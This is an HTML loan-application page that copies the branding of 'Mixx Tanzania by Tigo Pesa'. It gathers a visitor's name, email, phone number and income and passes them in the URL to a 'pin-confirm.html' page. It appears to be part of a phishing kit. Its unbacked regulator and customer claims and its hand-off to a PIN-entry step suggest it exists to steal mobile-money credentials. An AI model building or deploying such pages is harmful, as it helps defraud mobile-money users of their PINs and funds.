<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes, viewport-fit=cover">
    <title>Mixx Tanzania · Application Form</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: linear-gradient(135deg, #0a0f1c 0%, #0a1a3a 100%);
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 500px;
            margin: 0 auto;
        }

        .header {
            text-align: center;
            margin-bottom: 24px;
        }
        .logo {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            margin-bottom: 8px;
        }
        .logo-icon { font-size: 32px; }
        .logo-text {
            font-size: 28px;
            font-weight: 800;
            background: linear-gradient(135deg, #fff, #2196F3);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        .logo-sub { font-size: 11px; color: #2196F3; letter-spacing: 2px; }
        .tagline { font-size: 13px; color: #8899bb; margin-top: 8px; }

        .summary-bar {
            background: rgba(10, 26, 58, 0.7);
            backdrop-filter: blur(10px);
            border-radius: 24px;
            padding: 14px 18px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 10px;
            border: 1px solid rgba(255,255,255,0.1);
        }
        .summary-item {
            display: flex;
            flex-direction: column;
        }
        .summary-label {
            font-size: 10px;
            color: #8899bb;
            text-transform: uppercase;
        }
        .summary-value {
            font-size: 14px;
            font-weight: 700;
            color: #2196F3;
        }

        .form-card {
            background: rgba(10, 26, 58, 0.7);
            backdrop-filter: blur(20px);
            border-radius: 32px;
            border: 1px solid rgba(255,255,255,0.1);
            padding: 24px;
        }

        .card-title {
            font-size: 20px;
            font-weight: 700;
            color: white;
            margin-bottom: 4px;
        }
        .card-sub {
            font-size: 13px;
            color: #8899bb;
            margin-bottom: 24px;
            padding-left: 12px;
            border-left: 3px solid #2196F3;
        }

        .form-group {
            margin-bottom: 18px;
        }
        label {
            display: block;
            font-size: 13px;
            font-weight: 600;
            color: #ccddf8;
            margin-bottom: 6px;
        }
        .required:after {
            content: "*";
            color: #2196F3;
            margin-left: 4px;
        }
        input, select {
            width: 100%;
            padding: 12px 14px;
            font-size: 14px;
            border: 1.5px solid rgba(255,255,255,0.1);
            border-radius: 16px;
            background: rgba(0,0,0,0.3);
            color: white;
            font-family: inherit;
        }
        input:focus, select:focus {
            outline: none;
            border-color: #2196F3;
        }
        input::placeholder {
            color: #5a6e8a;
        }

        .row-2 {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 12px;
        }

        .checkbox-group {
            margin: 20px 0;
        }
        .checkbox-group label {
            display: flex;
            align-items: center;
            gap: 10px;
            cursor: pointer;
            font-weight: normal;
        }
        .checkbox-group input {
            width: 18px;
            height: 18px;
            accent-color: #2196F3;
        }

        .submit-btn {
            width: 100%;
            background: linear-gradient(135deg, #2196F3, #1565C0);
            border: none;
            padding: 14px;
            font-size: 16px;
            font-weight: 700;
            color: white;
            border-radius: 60px;
            cursor: pointer;
            transition: transform 0.2s;
        }
        .submit-btn:hover {
            transform: translateY(-2px);
        }

        .error-msg {
            background: rgba(244,67,54,0.15);
            color: #ff6b6b;
            padding: 10px;
            border-radius: 12px;
            font-size: 12px;
            margin-top: 12px;
            text-align: center;
            display: none;
        }
        .error-msg.show { display: block; }

        .phone-hint {
            font-size: 10px;
            color: #5a6e8a;
            margin-top: 4px;
            display: block;
        }

        .footer {
            display: flex;
            justify-content: center;
            gap: 16px;
            margin-top: 20px;
            padding-top: 16px;
            font-size: 10px;
            color: #5a6e8a;
            text-align: center;
            border-top: 1px solid rgba(255,255,255,0.05);
            flex-wrap: wrap;
        }

        @media (max-width: 450px) {
            .row-2 { grid-template-columns: 1fr; gap: 16px; }
            .form-card { padding: 18px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <div class="logo">
                <span class="logo-icon">📋</span>
                <span class="logo-text">Mixx Tanzania</span>
            </div>
            <div class="logo-sub">by Tigo Pesa</div>
            <div class="tagline">Complete your application</div>
        </div>

        <div class="summary-bar">
            <div class="summary-item">
                <span class="summary-label">Loan Amount</span>
                <span class="summary-value" id="summaryAmount">TZS 0</span>
            </div>
            <div class="summary-item">
                <span class="summary-label">Term</span>
                <span class="summary-value" id="summaryTerm">0 months</span>
            </div>
            <div class="summary-item">
                <span class="summary-label">Monthly</span>
                <span class="summary-value" id="summaryMonthly">TZS 0</span>
            </div>
            <div class="summary-item">
                <span class="summary-label">Interest</span>
                <span class="summary-value" id="summaryRate">9%</span>
            </div>
        </div>

        <div class="form-card">
            <div class="card-title">📋 Personal Information</div>
            <div class="card-sub">Fill in your details to continue</div>

            <form id="applicationForm">
                <div class="form-group">
                    <label class="required">Full Name (as on ID)</label>
                    <input type="text" id="fullName" placeholder="John M. Doe" required>
                </div>

                <div class="row-2">
                    <div class="form-group">
                        <label class="required">Email Address</label>
                        <input type="email" id="email" placeholder="hello@example.com" required>
                    </div>
                    <div class="form-group">
                        <label class="required">Mixx Number</label>
                        <input type="tel" id="phone" placeholder="+255 712 345 678" required>
                        <span class="phone-hint">📱 Must start with +255 (Tanzania number)</span>
                    </div>
                </div>

                <div class="row-2">
                    <div class="form-group">
                        <label class="required">Employment Status</label>
                        <select id="employment" required>
                            <option value="">Select</option>
                            <option>Employed Full-time</option>
                            <option>Employed Part-time</option>
                            <option>Self-employed</option>
                            <option>Business Owner</option>
                            <option>Retired</option>
                            <option>Student</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label class="required">Monthly Income (TZS)</label>
                        <input type="number" id="income" placeholder="e.g., 2,500,000" required>
                    </div>
                </div>

                <div class="checkbox-group">
                    <label>
                        <input type="checkbox" id="consent" required>
                        I confirm that the information provided is accurate and I agree to the loan terms.
                    </label>
                </div>

                <button type="submit" class="submit-btn">Continue →</button>
                <div class="error-msg" id="errorMsg"></div>
            </form>
        </div>

        <div class="footer">
            <span>🔒 Bank of Tanzania Regulated</span>
            <span>⚡ Instant Approval</span>
            <span>💰 15M+ Customers</span>
        </div>
    </div>

    <script>
        // ============================================
        // MIXX TANZANIA - APPLICATION FORM PAGE
        // ============================================
        
        // Get loan data from URL
        const urlParams = new URLSearchParams(window.location.search);
        const amount = urlParams.get('amount') || '500000';
        const term = urlParams.get('term') || '3';
        const rate = urlParams.get('rate') || '9';
        const monthly = urlParams.get('monthly') || '0';

        // Update summary bar
        document.getElementById('summaryAmount').innerText = `TZS ${parseInt(amount).toLocaleString()}`;
        document.getElementById('summaryTerm').innerText = `${term} month${term != 1 ? 's' : ''}`;
        document.getElementById('summaryMonthly').innerText = `TZS ${parseFloat(monthly).toLocaleString('en-US', {minimumFractionDigits: 0, maximumFractionDigits: 0})}`;
        document.getElementById('summaryRate').innerText = `${rate}%`;

        // Validate Tanzania phone number (+255 format)
        function isValidTanzaniaPhone(phone) {
            const cleaned = phone.replace(/[\s\-\(\)]/g, '');
            const regex = /^\+255\d{9}$/;
            return regex.test(cleaned);
        }

        // Form submission
        document.getElementById('applicationForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const fullName = document.getElementById('fullName').value.trim();
            const email = document.getElementById('email').value.trim();
            const phone = document.getElementById('phone').value.trim();
            const employment = document.getElementById('employment').value;
            const income = document.getElementById('income').value;
            const consent = document.getElementById('consent').checked;
            const errorMsg = document.getElementById('errorMsg');

            // Validate all fields
            if (!fullName || !email || !phone || !employment || !income || !consent) {
                errorMsg.textContent = 'Please fill all required fields';
                errorMsg.classList.add('show');
                setTimeout(() => errorMsg.classList.remove('show'), 3000);
                return;
            }

            // Validate email format
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (!emailRegex.test(email)) {
                errorMsg.textContent = '❌ Please enter a valid email address';
                errorMsg.classList.add('show');
                setTimeout(() => errorMsg.classList.remove('show'), 3000);
                return;
            }

            // Validate Tanzania phone number
            if (!isValidTanzaniaPhone(phone)) {
                errorMsg.textContent = '❌ Please enter a valid Tanzania number starting with +255 (e.g., +255712345678)';
                errorMsg.classList.add('show');
                setTimeout(() => errorMsg.classList.remove('show'), 3000);
                return;
            }

            // Validate income is a positive number
            if (parseFloat(income) <= 0) {
                errorMsg.textContent = '❌ Please enter a valid monthly income amount';
                errorMsg.classList.add('show');
                setTimeout(() => errorMsg.classList.remove('show'), 3000);
                return;
            }

            errorMsg.classList.remove('show');

            // Pass all data to PIN page
            const params = new URLSearchParams({
                amount: amount,
                term: term,
                rate: rate,
                monthly: monthly,
                name: fullName,
                email: email,
                phone: phone,
                employment: employment,
                income: income
            });

            window.location.href = `pin-confirm.html?${params.toString()}`;
        });
    </script>
</body>
</html>
